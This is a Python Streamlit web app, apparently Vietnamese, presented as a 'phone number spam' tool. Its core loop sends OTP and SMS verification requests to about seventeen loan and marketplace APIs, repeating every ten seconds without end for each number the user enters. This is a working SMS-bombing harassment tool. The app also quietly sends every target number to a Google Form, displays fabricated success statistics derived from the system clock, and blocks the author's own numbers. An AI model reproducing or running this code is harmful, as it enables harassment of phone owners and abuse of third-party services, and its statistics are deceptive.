import streamlit as st
from streamlit.report_thread import add_report_ctx
import streamlit.components.v1 as components
import threading
from time import sleep
import requests
from PIL import Image
import time
class App:
    def __init__(self):
        st.set_page_config(
             page_title="Spam Số Điện Thoại By Thầy Trường",
             page_icon=":shark:"
        )
        st.title("Spam Số Điện Thoại By Thầy Trường")
        self.initCSS()
        self.message=""
        self.count = 1
    def initCSS(self):
        css = '''
        <style>
        div[data-testid="stToolbar"],
        div[data-testid="stReportViewContainer"]>section>footer
        {
            display:none;
        }

        </style>
        '''
        st.markdown(css, unsafe_allow_html=True)
    def buttonCSS(self):
        # response = requests.get("https://d25tv1xepz39hi.cloudfront.net/2016-01-31/files/1045.jpg")
        # img = Image.open(BytesIO(response.content))
        # st.image(img,use_column_width=True)
        css = '''
        <style>
        button[class="css-ns78wr edgvbvh1"]{
            display:none;
        }
        </style>
        '''
        """
        .stApp {
        background-color: black;
        background-size: contain;
        background-repeat: no-repeat;
        background-attachment: scroll;
        }
        div[data-testid="stMetricValue"],
        div[data-testid="stMarkdownContainer"]>h1>div>span,
        label[data-testid="stMetricLabel"]>div,
        label[class="css-qrbaxs effi0qh0"],
        div[data-testid="stMarkdownContainer"]>small>p,
        label
        {
            color:white;
        }
        svg[class="icon"]{
            stroke:rgb(255 255 255 / 100%);
        }
        svg[class="icon"]:hover{
            stroke:rgb(255 255 255 / 80%);
        }"""
        st.markdown(css, unsafe_allow_html=True)
    def javaScript(self):
        script = '''
        <script language="javascript">
            alert("hong được đâu pé ơi !!! :)))")
        </script>
        '''
        components.html(script)
        st.markdown(script, unsafe_allow_html=True)
    def createSidebar(self):
        st.sidebar.text("Nếu có thắc mắc\nVui lòng liên hệ Thầy Trường!")
        st.sidebar.markdown("[Liên Hệ Thầy Trường](https://www.facebook.com/100029031824085)", unsafe_allow_html=True)
        st.sidebar.write("Liên Kết MXH Khác:")
        link = '[Youtube](https://www.youtube.com/channel/UCR33v6d0J3ia4T69_7dUITA) <br> [Github](https://github.com/truongjae)'
        st.sidebar.markdown(link, unsafe_allow_html=True)
        code = '''print("Ủng hộ chất xám của thầy")\nprint("Nhớ đôn lết cho thầy nha!")'''
        st.sidebar.code(code, language='python')
        st.sidebar.write("STK: ")
        code = '''0345382198'''
        st.sidebar.code(code, language='python')
        st.sidebar.write("Tên TK: ")
        code = '''nguyen gia truong'''.upper()
        st.sidebar.code(code, language='python')
        st.sidebar.write("Ngân Hàng: ")
        code = '''MB Bank'''
        st.sidebar.code(code, language='python')
        st.sidebar.write("Tiện Ích Khác: ")
        link = '[Tool Facebook Siêu Cấp](https://fbtoolstruongjae.herokuapp.com/) <br> [Google Đọc Bình Luận Livestream](https://www.youtube.com/watch?v=uy3J7G0WhKg)'
        st.sidebar.markdown(link, unsafe_allow_html=True)
        st.sidebar.write("Copyright Truongjae 2022 ©")

    def tryCatchAPI(self,url,pload,typeData):
        try:
            if typeData == "json":
                requests.post(url,json=pload)
            else:
                requests.post(url,data=pload)
            process = st.empty()
            with process.container():
               st.success("Hàng tỉ sát thương >: "+str(self.count)+" lần")
               sleep(0.5)
            process.empty()
            self.count+=1
        except:
            process = st.empty()
            with process.container():
               st.error("Lỗi 1 phát... Nhưng Đừng Lo Nha Pé!")
            process.empty()
    @st.cache(suppress_st_warning=True)
    def spamPhone(self,arrPhone):
        sdt = arrPhone.split(",")
        i=0
        while True:
            phone = sdt[i]

            pload = {"mobilePhone":phone,"password":"R2mpP2.EdLS#i5","passwordConfirmation":"R2mpP2.EdLS#i5","isVoiceSms":True}
            url = "https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode"
            self.tryCatchAPI(url,pload,"json")

            pload = {"name":"Tu Le Dang","phoneNumber":phone}
            url = "https://webvay.vn/po/api/signup/sendOtp"
            self.tryCatchAPI(url,pload,"json")
            
            pload = {"mobile":phone}
            url = "https://api.magpiecredit.com/user/sendCode-h5"
            self.tryCatchAPI(url,pload,"data")

            pload = {"phoneNumber": phone}
            url = "https://moneyveo.vn/vi/registernew/sendsmsjson/"
            self.tryCatchAPI(url,pload,"data")

            pload = {"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":None,"termSysVersion":"10","termModel":"","brand":"","termId":"","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":None,"lat":None},"bizType":"201","appName":"Vay Tia Chớp","packageName":"com.firstvay.h5","screenResolution":"1920,1080"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1634575899216","bizParams":{"phoneNum":phone,"code":None,"type":200,"channelCode":"Ie9ja"}}
            url = "https://api.first-vay.com/pdl-abroad-main/app/member/sendSmsCode"
            self.tryCatchAPI(url,pload,"json")

            pload = {"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":None,"termSysVersion":"10","termModel":"","brand":"","termId":None,"appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":None,"lat":None},"bizType":"0000","appName":"Vi May Man","packageName":"com.vimaymanvn.h5","screenResolution":"1920,1080"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1634576326968","bizParams":{"phoneNum":phone,"code":None,"type":200,"channelCode":"3Wr7a"}}
            url = "https://api.vmayman.com/app/member/sendSmsCode"
            self.tryCatchAPI(url,pload,"json")

            pload = {"mobile": phone}
            url = "https://wenvey.com/_api/auth/login/sms"
            self.tryCatchAPI(url,pload,"data")

            pload = {"phone":phone}
            url = "https://gateway.chotot.com/v2/public/auth/send_otp_verify"
            self.tryCatchAPI(url,pload,"json")

            pload = {"mobile": phone}
            url = "https://api.magpiecredit.com/user/sendCode-h5"
            self.tryCatchAPI(url,pload,"data")

            pload = {"loan_phone": phone,"action": "fe_loan_resendotp"}
            url = "https://fecredit.com.vn/wp-admin/admin-ajax.php"
            self.tryCatchAPI(url,pload,"data")

            pload = {"login":phone}
            url = "https://api.vayvnd.vn/v1/users/password-reset"
            self.tryCatchAPI(url,pload,"json")

            pload = {"phone": phone,"sign": "67d44dda-b29f-48a4-9830-67121bc618f8"}
            url = "https://api.vtvay.com/v1/verify/sms/send"
            self.tryCatchAPI(url,pload,"data")

            pload = {"mobile": phone,"companyId":"5e030a2d0683f71328532063","appId":"5e030a1b0683f71328532062","userType":1}
            url = "https://www.hbcredit.cc/sms/login"
            self.tryCatchAPI(url,pload,"json")

            pload = {"mobile": phone,"companyId":"5e030a2d0683f71328532063","appId":"5e030a1b0683f71328532062","userType":1}
            url = "http://www.vayhome.com/sms/login"
            self.tryCatchAPI(url,pload,"json")

            pload = {"phone": phone,"sign": "67d44dda-b29f-48a4-9830-67121bc618f8"}
            url = "https://api.tiencash.com/v1/verify/sms/send"
            self.tryCatchAPI(url,pload,"data")

            try:
                requests.post("https://webapp.okmoney.cc/_api/auth/login/sms?mobile="+phone)
            except:
                pass

            pload = {"mobile": phone}
            url = "http://h5.postvay.com/_api/auth/login/sms"
            self.tryCatchAPI(url,pload,"data")
            i+=1
            if i==len(sdt):
                i=0
            sleep(10)
    def runThreadSpam(self,arrPhone):
        thread = threading.Thread(target=self.spamPhone,args=(arrPhone,))
        add_report_ctx(thread)
        thread.start()
    def savePhone(self,phone):
        data = {
        "entry.1826012699": phone
        }
        requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdhLpU6k8D2mPFvLNBqVGWks5qq6ZbczgJO1z0DKJkLKnXVNA/formResponse",data=data)
    def run(self):
        self.createSidebar()
        mobile_number=st.text_input("Nhập số điện thoại: ",placeholder="Nếu nhiều sdt thì ngăn cách nhau bởi dấu phẩy VD: 0935115536,0365452365,0854625548",help= "Nếu nhiều sdt thì ngăn cách nhau bởi dấu phẩy")
        col1, col2, col3 = st.columns(3)
        sumSpam = int(time.time())
        success = sumSpam-(sumSpam//(sumSpam%999))
        error = sumSpam - success
        percentSuccess = round(success/sumSpam,4)*100
        percentError = round(error/sumSpam,4)*100
        col1.metric("Số Lượt Spam", str(sumSpam), "1.5")
        col2.metric("Thành Công", str(success), str(percentSuccess)+"%")
        col3.metric("Thất Bại", str(error), "-"+str(percentError)+"%")
        linkContact = '[Liên Hệ Thầy Trường](https://facebook.com/100029031824085)'
        st.markdown(linkContact, unsafe_allow_html=True)
        if st.button("Xiên nuôn",help= "Nhấn vào để xiên"):
            self.buttonCSS()
            self.savePhone(mobile_number)
            checkPhone = True
            nono=['0345382198','345382198','+84345382198','0964017787','964017787','+84964017787']
            for i in nono:
                if i in mobile_number:
                    checkPhone = False
                    break
            if checkPhone:
                st.caption('Đang xiên...')
                # self.runThreadSpam(mobile_number)
                st.success("Tới Công Chuyện Lun Pé Owi :))")
                img = Image.open("tu.jpg")
                st.image(img,use_column_width=True)
                self.spamPhone(mobile_number)
            else:
                self.javaScript()
if __name__=="__main__":
    App().run()